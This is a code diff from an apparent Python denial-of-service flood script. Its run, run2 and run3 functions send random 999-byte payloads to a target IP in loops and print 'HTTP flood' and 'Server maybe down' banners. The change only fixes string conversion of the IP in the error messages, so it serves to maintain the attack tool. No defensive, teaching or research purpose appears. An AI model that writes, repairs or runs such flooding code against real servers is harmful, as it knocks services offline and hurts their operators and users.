@@ -59,7 +59,7 @@ def run():
 				s.sendto(data,addr)
 			print(i *" \036[4mC R A S H  \033[37mHTTP flood  \033[35m" +str(ip)+ " \033[32m" +(time)+ "")
 		except:
-			print(i *" \036[33mC R A S H  \033[37mHTTP flood  \033[4m" +(ip)+ " \033[30mServer meybe down..!\033[0m")
+			print(i *" \036[33mC R A S H  \033[37mHTTP flood  \033[4m" +str(ip)+ " \033[30mServer meybe down..!\033[0m")
 				
 def run2():
 	data = random._urandom(999)
@@ -74,7 +74,7 @@ def run2():
 			print(i *" \036[33mC R A S H  \033[37mHTTP flood  \033[4m" +str(ip)+ " \033[37m" +(times)+ "")
 		except:
 			s.close()
-			print(i *" \036[33mC R A S H  \033[37mHTTP flood  \033[4m" +(ip)+ " \033[30mServer meybe down..!")
+			print(i *" \036[33mC R A S H  \033[37mHTTP flood  \033[4m" +str(ip)+ " \033[30mServer meybe down..!")
             
 
 def run3():
@@ -90,7 +90,7 @@ def run3():
 			print(i *" \036[33mC R A S H  \033[37mHTTP flood  \033[4m" +str(ip)+ " \033[37m" +(times)+ "")
 		except:
 			s.close()
-			print(i *" \036[33mC R A S H  \033[37mHTTP flood  \033[4m" +(ip)+ " \033[30mServer meybe down..!\033[0m")
+			print(i *" \036[33mC R A S H  \033[37mHTTP flood  \033[4m" +str(ip)+ " \033[30mServer meybe down..!\033[0m")
 				
 							
             
